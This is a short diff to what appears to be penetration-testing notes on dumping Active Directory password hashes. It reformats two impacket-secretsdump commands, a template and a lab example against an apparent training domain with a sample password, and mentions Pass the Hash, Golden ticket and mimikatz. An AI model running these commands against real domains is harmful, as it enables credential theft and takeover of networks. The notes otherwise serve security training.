@@ -45,8 +45,10 @@ We can use this hashes in Pass the Hash attacks, Golden tickets attacks(with the
 
 ### With secretsdump
 
-    impacket-secretsdump -outputfile <file_to_save_hashes> -just-dc <domain_name>/<username_with_permissions>:<password>@<dc_ip>
-    impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/tpetty:password1!@DC01.INLANEFREIGHT.LOCAL
+```shell
+impacket-secretsdump -outputfile <file_to_save_hashes> -just-dc <domain_name>/<username_with_permissions>:<password>@<dc_ip>
+impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/tpetty:password1!@DC01.INLANEFREIGHT.LOCAL
+```
 
 ### With mimikatz
 
